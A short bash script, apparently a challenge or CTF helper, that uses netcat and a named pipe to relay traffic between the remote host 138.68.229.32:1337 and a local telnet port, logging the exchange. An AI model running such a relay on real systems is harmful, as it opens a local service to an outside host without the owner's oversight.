#!/usr/bin/env bash
tail -f pipe | nc 138.68.229.32 1337 | tee outgoing.log | nc 127.0.0.1 23 -c"net\ncat\n\n" | tee pipe
echo net > pipe
echo cat > pipe
